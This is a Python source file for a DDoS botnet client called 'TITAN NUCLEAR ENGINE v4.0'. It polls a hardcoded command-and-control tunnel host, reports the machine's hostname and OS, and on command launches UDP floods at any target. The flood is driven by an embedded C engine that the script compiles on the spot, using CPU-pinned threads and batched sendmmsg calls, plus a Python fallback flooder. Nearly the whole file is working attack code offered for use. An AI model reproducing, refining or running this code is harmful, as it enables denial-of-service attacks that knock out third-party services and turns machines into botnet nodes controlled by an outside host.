#!/usr/bin/env python3
"""
  ENI & LO — TITAN NUCLEAR ENGINE v4.0 (2026)
  ============================================
  Maximum bandwidth saturation per machine.
  Multi-process, CPU-pinned, multi-socket sendmmsg.

  Usage:
    python3 bot_client.py                    # auto-detect optimal bot count
    python3 bot_client.py 4                  # 4 bot workers
    python3 bot_client.py custom.link.com 443
    python3 bot_client.py 4 custom.link.com 443
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, string, os, subprocess, signal

if os.name == 'nt':
    os.system('color')

# ============================================================================
#  CONFIG
# ============================================================================
DEFAULT_C2   = "come-spectacular-northern-vip.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  NUCLEAR C-ENGINE v4 — CPU-pinned, multi-socket, max MTU, tuned buffers
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>

#define BATCH          1024
#define PKTSIZE        1472
#define SOCKS          4

static volatile int g_run = 1;
static char         g_ip[64];
static int          g_port;
static int          g_ncpu;
static unsigned long long g_pkts  = 0;
static unsigned long long g_bytes = 0;

void on_sig(int s) { g_run = 0; }

void* telemetry(void* x) {
    unsigned long long lp = 0, lb = 0;
    while (g_run) {
        sleep(1);
        unsigned long long cp = __atomic_load_n(&g_pkts,  __ATOMIC_RELAXED);
        unsigned long long cb = __atomic_load_n(&g_bytes, __ATOMIC_RELAXED);
        double gbps = ((cb - lb) * 8.0) / (1024.0 * 1024.0 * 1024.0);
        double mbps = ((cb - lb) * 8.0) / (1024.0 * 1024.0);
        unsigned long long pps = cp - lp;
        if (gbps >= 1.0)
            printf("\033[92m[NUCLEAR STREAM]\033[0m Sent: \033[97m%llu\033[0m pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Gbps\033[0m | \033[95mUDP-sendmmsg\033[0m\n", cp, pps, gbps);
        else
            printf("\033[92m[NUCLEAR STREAM]\033[0m Sent: \033[97m%llu\033[0m pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Mbps\033[0m | \033[95mUDP-sendmmsg\033[0m\n", cp, pps, mbps);
        fflush(stdout);
        lp = cp; lb = cb;
    }
    return NULL;
}

void* worker(void* arg) {
    int tid = *(int*)arg;
    free(arg);

    /* Pin thread to CPU core */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(tid % g_ncpu, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    /* Create multiple sockets to spread kernel lock contention */
    int fds[SOCKS];
    for (int s = 0; s < SOCKS; s++) {
        fds[s] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fds[s] < 0) { fds[s] = fds[0]; continue; }
        int bufsize = 4 * 1024 * 1024;
        setsockopt(fds[s], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    char payload[PKTSIZE];
    memset(payload, 'Z', PKTSIZE);

    struct iovec   iov[BATCH];
    struct mmsghdr msg[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base         = payload;
        iov[i].iov_len          = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name    = &dst;
        msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov     = &iov[i];
        msg[i].msg_hdr.msg_iovlen  = 1;
    }

    int si = 0;
    while (g_run) {
        int r = sendmmsg(fds[si], msg, BATCH, 0);
        if (r > 0) {
            __atomic_fetch_add(&g_pkts,  (unsigned long long)r,            __ATOMIC_RELAXED);
            __atomic_fetch_add(&g_bytes, (unsigned long long)r * PKTSIZE,  __ATOMIC_RELAXED);
        }
        si = (si + 1) % SOCKS;  /* rotate across sockets */
    }

    for (int s = 0; s < SOCKS; s++) close(fds[s]);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) { fprintf(stderr, "Usage: %s <ip> <port> <threads>\n", argv[0]); return 1; }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int nth = atoi(argv[3]);
    if (nth < 1)   nth = 4;
    if (nth > 256) nth = 256;
    g_ncpu = sysconf(_SC_NPROCESSORS_ONLN);

    signal(SIGTERM, on_sig);
    signal(SIGINT,  on_sig);

    printf("\033[96m[NUCLEAR ENGINE v4]\033[0m Target: %s:%d | Threads: %d | Cores: %d | Sockets/thread: %d\n",
           g_ip, g_port, nth, g_ncpu, SOCKS);

    pthread_t mon;
    pthread_create(&mon, NULL, telemetry, NULL);

    pthread_t thr[256];
    for (int i = 0; i < nth; i++) {
        int* id = malloc(sizeof(int));
        *id = i;
        pthread_create(&thr[i], NULL, worker, id);
    }
    for (int i = 0; i < nth; i++)
        pthread_join(thr[i], NULL);

    g_run = 0;
    pthread_join(mon, NULL);
    return 0;
}
"""

# ============================================================================
#  ENGINE COMPILER
# ============================================================================
ENGINE_BIN = None

def ensure_engine():
    global ENGINE_BIN
    if platform.system() != "Linux":
        return None
    binpath = os.path.join(os.getcwd(), "nuclear_engine")
    # Always recompile to get latest optimizations
    srcpath = os.path.join(os.getcwd(), "nuclear_engine.c")
    with open(srcpath, "w") as f:
        f.write(C_ENGINE)
    r = subprocess.run(
        ["gcc", "-O3", "-march=native", "-funroll-loops", "-flto",
         srcpath, "-o", binpath, "-lpthread"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    if r.returncode == 0 and os.path.isfile(binpath):
        os.chmod(binpath, 0o755)
        print("\033[92m[+] NUCLEAR C-Engine v4 compiled (gcc -O3 -march=native -flto)\033[0m")
        ENGINE_BIN = binpath
        return binpath
    # Fallback without -march=native (ARM compatibility)
    r2 = subprocess.run(
        ["gcc", "-O3", "-funroll-loops", srcpath, "-o", binpath, "-lpthread"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    if r2.returncode == 0 and os.path.isfile(binpath):
        os.chmod(binpath, 0o755)
        print("\033[92m[+] NUCLEAR C-Engine v4 compiled (gcc -O3 fallback)\033[0m")
        ENGINE_BIN = binpath
        return binpath
    print(f"\033[91m[-] Compile failed: {r.stderr.decode()}\033[0m")
    return None

# ============================================================================
#  STATE
# ============================================================================
g_atk   = False
g_atkid = None
g_pkts  = 0
g_bytes = 0
g_errs  = 0
g_proc  = None

# ============================================================================
#  PYTHON FALLBACK
# ============================================================================
def py_udp(target, port, dur, atkid):
    global g_atk, g_atkid, g_pkts, g_bytes, g_errs
    end = time.time() + dur
    pld = os.urandom(1472)
    plen = len(pld)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    while g_atk and g_atkid == atkid and time.time() < end:
        try:
            for _ in range(256):
                s.sendto(pld, (target, port))
            g_pkts  += 256
            g_bytes += plen * 256
        except:
            g_errs += 1
    try: s.close()
    except: pass

def py_telemetry(target, port, vec, atkid):
    global g_pkts, g_bytes, g_errs, g_atk, g_atkid
    lp = lb = 0; lt = time.time()
    print(f"\n\033[96m[PYTHON TELEMETRY]\033[0m {target}:{port}\n")
    while g_atk and g_atkid == atkid:
        time.sleep(1)
        now = time.time(); dt = now - lt
        if dt <= 0: continue
        cp, cb, ce = g_pkts, g_bytes, g_errs
        pps = int((cp - lp) / dt)
        gbps = ((cb - lb) * 8) / (dt * 1024 * 1024 * 1024)
        mbps = ((cb - lb) * 8) / (dt * 1024 * 1024)
        lp, lb, lt = cp, cb, now
        spd = f"{gbps:.2f} Gbps" if gbps >= 1 else f"{mbps:.2f} Mbps"
        print(f"\033[92m[FLOOD]\033[0m Sent: \033[97m{cp:,}\033[0m | \033[93m{pps:,} PPS\033[0m (\033[96m{spd}\033[0m) | Err: \033[91m{ce}\033[0m | \033[95m{vec}\033[0m")

# ============================================================================
#  ATTACK CONTROL
# ============================================================================
def stop():
    global g_atk, g_atkid, g_proc
    g_atk = False; g_atkid = None
    if g_proc:
        try: g_proc.terminate(); g_proc.kill()
        except: pass
        g_proc = None
    print("\033[91m[*] Attack stopped.\033[0m")

def fire(target, port, dur, threads, atkid, vec="UDP"):
    global g_atk, g_atkid, g_pkts, g_bytes, g_errs, g_proc
    if g_atkid == atkid and g_atk:
        return
    stop()
    g_atkid = atkid; g_pkts = 0; g_bytes = 0; g_errs = 0; g_atk = True

    # Use ALL cores: threads = CPU_CORES * 2 for hyper-saturation
    th = max(threads, CPU_CORES * 2)

    print(f"\n\033[91m[☢ NUCLEAR LAUNCH]\033[0m {vec} -> \033[97m{target}:{port}\033[0m | {dur}s | {th} threads | {th * 4} sockets")

    eng = ensure_engine() if vec == "UDP" else None

    if eng:
        print(f"\033[92m[⚡ NUCLEAR ENGINE ACTIVE — CPU-pinned multi-socket sendmmsg]\033[0m")
        try:
            g_proc = subprocess.Popen(
                [eng, target, str(port), str(th)],
                stdout=sys.stdout, stderr=sys.stderr
            )
        except Exception as e:
            print(f"\033[91m[!] Engine error: {e}\033[0m"); eng = None

    if not eng:
        for _ in range(th):
            threading.Thread(target=py_udp, args=(target, port, dur, atkid), daemon=True).start()
        threading.Thread(target=py_telemetry, args=(target, port, vec, atkid), daemon=True).start()

    def cleanup():
        time.sleep(dur)
        global g_atk, g_atkid, g_proc
        if g_atkid == atkid:
            g_atk = False; g_atkid = None
            if g_proc:
                try: g_proc.terminate(); g_proc.kill()
                except: pass
                g_proc = None
            print(f"\n\033[92m[✓] Attack {atkid} finished.\033[0m\n")
    threading.Thread(target=cleanup, daemon=True).start()

# ============================================================================
#  BOT WORKER
# ============================================================================
def bot_worker(wid, c2h, c2p):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(10000,99999)}"
    proto = "https" if c2p == 443 else "http"
    base  = f"{proto}://{c2h}" if c2p in (80,443) else f"{proto}://{c2h}:{c2p}"
    poll  = f"{base}/poll"

    print(f"\033[96m[W-{wid}]\033[0m Bot \033[92m{bid}\033[0m -> \033[93m{poll}\033[0m")

    conn = False
    last = None

    while True:
        try:
            body = json.dumps({
                "bot_id": bid,
                "hostname": platform.node(),
                "os": f"{platform.system()} {platform.release()}"
            }).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                if not conn:
                    print(f"\033[92m[W-{wid}] ONLINE: {bid}\033[0m")
                    conn = True
                raw = resp.read().decode()
                cmd = json.loads(raw) if raw else {}
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid and aid != last:
                    last = aid
                    fire(
                        cmd.get("target"),
                        int(cmd.get("port", 80)),
                        int(cmd.get("duration", 60)),
                        int(cmd.get("threads", CPU_CORES * 2)),
                        aid,
                        cmd.get("vector", "UDP")
                    )
                elif act in ("STOP", "IDLE"):
                    if g_atk:
                        stop()
                        last = None
        except:
            pass
        time.sleep(0.5)

# ============================================================================
#  MAIN
# ============================================================================
def main():
    args  = sys.argv[1:]
    count = 1
    host  = DEFAULT_C2
    port  = DEFAULT_PORT

    for a in args:
        if a.isdigit() and int(a) <= 64:
            count = int(a)
        elif a.isdigit():
            port = int(a)
        elif "." in a:
            host = a

    if len(args) >= 3:
        if not args[0].isdigit():
            host = args[0]; port = int(args[1]) if args[1].isdigit() else port
        else:
            count = int(args[0])
            host = args[1] if "." in args[1] else host
            port = int(args[2]) if args[2].isdigit() else port
    elif len(args) == 2:
        if "." in args[0]:
            host = args[0]
            port = int(args[1]) if args[1].isdigit() else port

    print(f"\033[91m{'='*72}\033[0m")
    print(f"\033[91m  ☢  ENI & LO — TITAN NUCLEAR ENGINE v4.0 (2026)  ☢\033[0m")
    print(f"\033[91m{'='*72}\033[0m")
    print(f"  C2        : \033[93mhttps://{host}\033[0m")
    print(f"  Bots      : \033[92m{count}\033[0m")
    print(f"  CPU Cores : \033[97m{CPU_CORES}\033[0m")
    print(f"  Threads   : \033[97m{CPU_CORES * 2}/bot\033[0m (auto-tuned)")
    print(f"  Sockets   : \033[97m{CPU_CORES * 2 * 4}/bot\033[0m (multi-socket)")
    print(f"  Payload   : \033[97m1472 bytes\033[0m (max MTU)")
    print(f"  OS        : \033[97m{platform.system()} {platform.release()}\033[0m")
    print(f"\033[91m{'='*72}\033[0m\n")

    # Pre-compile engine
    ensure_engine()

    if count == 1:
        bot_worker(1, host, port)
    else:
        procs = []
        for i in range(count):
            p = multiprocessing.Process(target=bot_worker, args=(i+1, host, port), daemon=True)
            p.start()
            procs.append(p)
            print(f"\033[92m[+] Worker {i+1}/{count} spawned (PID {p.pid})\033[0m")
            time.sleep(0.2)
        print(f"\n\033[92m[✓] {count} workers active. Ctrl+C to stop.\033[0m\n")
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            print("\n\033[91m[!] Shutting down...\033[0m")
            for p in procs: p.terminate()

if __name__ == "__main__":
    main()
